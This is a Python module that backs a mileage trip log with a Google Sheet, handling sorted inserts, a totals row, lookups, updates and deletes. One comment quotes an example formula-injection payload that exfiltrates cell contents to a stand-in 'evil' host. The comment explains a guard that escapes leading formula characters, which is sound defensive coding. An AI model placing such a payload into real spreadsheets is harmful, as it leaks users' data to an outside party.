"""Google Sheet backend for trip log.

One row per trip in IRS-log format:
    Date | Destination | Purpose | Shape | Miles | Deduction $ | Trip ID | Logged At
"""

from __future__ import annotations

import re
from typing import Any

import gspread
from google.oauth2.service_account import Credentials

from .config import GOOGLE_SERVICE_ACCOUNT_JSON, GOOGLE_SHEET_ID, MILEAGE_TAB_NAME

HEADERS = [
    "Date",
    "Destination",
    "Purpose",
    "Shape",
    "Miles",
    "Deduction $",
    "Trip ID",
    "Logged At",
]

_SCOPES = [
    "https://www.googleapis.com/auth/spreadsheets",
    "https://www.googleapis.com/auth/drive",
]

_client: gspread.Client | None = None
_ws: gspread.Worksheet | None = None


def _gc() -> gspread.Client:
    global _client
    if _client is None:
        creds = Credentials.from_service_account_file(
            GOOGLE_SERVICE_ACCOUNT_JSON, scopes=_SCOPES
        )
        _client = gspread.authorize(creds)
    return _client


def ws() -> gspread.Worksheet:
    global _ws
    if _ws is not None:
        return _ws
    sh = _gc().open_by_key(GOOGLE_SHEET_ID)
    try:
        worksheet = sh.worksheet(MILEAGE_TAB_NAME)
    except gspread.WorksheetNotFound:
        worksheet = sh.add_worksheet(title=MILEAGE_TAB_NAME, rows=1000, cols=len(HEADERS))
        worksheet.append_row(HEADERS, value_input_option="USER_ENTERED")

    # If sheet exists but has no header row, add it.
    first_row = worksheet.row_values(1)
    if first_row != HEADERS:
        if not first_row:
            worksheet.append_row(HEADERS, value_input_option="USER_ENTERED")
        # If headers differ, leave them — assume user customized — but downstream
        # code matches by position, so they should keep the order.

    _ws = worksheet
    return worksheet


TOTALS_MARKER = "TOTAL"

# Sums everything above the formula's own row — no circular reference.
_TOTALS_ROW_TEMPLATE = [
    TOTALS_MARKER, "", "", "",
    '=SUM(INDIRECT("E2:E"&(ROW()-1)))',
    '=SUM(INDIRECT("F2:F"&(ROW()-1)))',
    "", "",
]


# Columns that hold numbers — pass through untouched so Sheets stores them numeric.
_NUMERIC_HEADERS = {"Miles", "Deduction $"}
# Leading chars Google Sheets treats as the start of a formula. Destination/Purpose
# are free-text; a value like '=IMPORTDATA("http://evil/?"&A1)' would execute on write
# (value_input_option=USER_ENTERED). A leading apostrophe forces plain text and is not
# displayed. Only the data-row write below is guarded — deliberate formulas (totals)
# must not be routed through this.
_FORMULA_TRIGGERS = ("=", "+", "-", "@")


def _safe_cell(header: str, value: Any) -> Any:
    if header in _NUMERIC_HEADERS:
        return value
    s = str(value if value is not None else "")
    if s[:1] in _FORMULA_TRIGGERS:
        return "'" + s
    return s


def append_trip(row: dict[str, Any]) -> None:
    values = [_safe_cell(h, row.get(h, "")) for h in HEADERS]
    new_date = str(row.get("Date", ""))

    worksheet = ws()
    all_values = worksheet.get_all_values()

    has_totals = bool(all_values and all_values[-1] and all_values[-1][0] == TOTALS_MARKER)
    totals_sheet_row = len(all_values) if has_totals else None
    data_rows = all_values[1:-1] if has_totals else all_values[1:]

    # Find the first data row whose Date is strictly after new_date.
    insert_index = None
    for i, sheet_row in enumerate(data_rows, start=2):
        row_date = sheet_row[0] if sheet_row else ""
        if new_date and row_date and row_date > new_date:
            insert_index = i
            break

    # If no later date, insert just before the totals row (or append if no totals).
    if insert_index is None:
        insert_index = totals_sheet_row

    if insert_index is not None:
        worksheet.insert_row(values, index=insert_index, value_input_option="USER_ENTERED")
    else:
        worksheet.append_row(values, value_input_option="USER_ENTERED")


def read_trips() -> list[dict[str, Any]]:
    # Exclude the totals row from query results.
    return [r for r in ws().get_all_records() if r.get("Date") != TOTALS_MARKER]


_ISO_DATE_RE = re.compile(r"^\d{4}-\d{2}-\d{2}$")


def locate_trips(
    trip_id: str | None = None,
    date: str | None = None,
    destination: str | None = None,
) -> list[tuple[int, dict[str, Any]]]:
    """Return (sheet_row_number, row_dict) for trips matching the criteria.

    row_number is the 1-based sheet row index (usable with update/delete).
    Matching: exact Trip ID (unique), exact ISO Date, and/or case-insensitive
    substring in Destination. The TOTAL footer and non-date rows are skipped.
    Reads raw values so the true row index is preserved.
    """
    all_values = ws().get_all_values()
    if not all_values:
        return []

    headers = all_values[0]
    matches: list[tuple[int, dict[str, Any]]] = []
    for i, r in enumerate(all_values[1:], start=2):
        row = {h: (r[j] if j < len(r) else "") for j, h in enumerate(headers)}
        row_date = str(row.get("Date", "")).strip()
        if row_date == TOTALS_MARKER:
            continue
        if trip_id is not None:
            if str(row.get("Trip ID", "")).strip() != trip_id.strip():
                continue
        elif date is not None:
            if row_date != date:
                continue
        elif not _ISO_DATE_RE.match(row_date):
            # No id/date filter: skip blanks and any non-trip rows.
            continue
        if destination and destination.lower() not in str(row.get("Destination", "")).lower():
            continue
        matches.append((i, row))
    return matches


def update_trip_row(row_number: int, updates: dict[str, Any]) -> None:
    """Update specific columns of an existing row in place. Keys must be header names."""
    worksheet = ws()
    for header, value in updates.items():
        if header not in HEADERS:
            continue
        worksheet.update_cell(row_number, HEADERS.index(header) + 1, _safe_cell(header, value))


def delete_trip_row(row_number: int) -> None:
    ws().delete_rows(row_number)
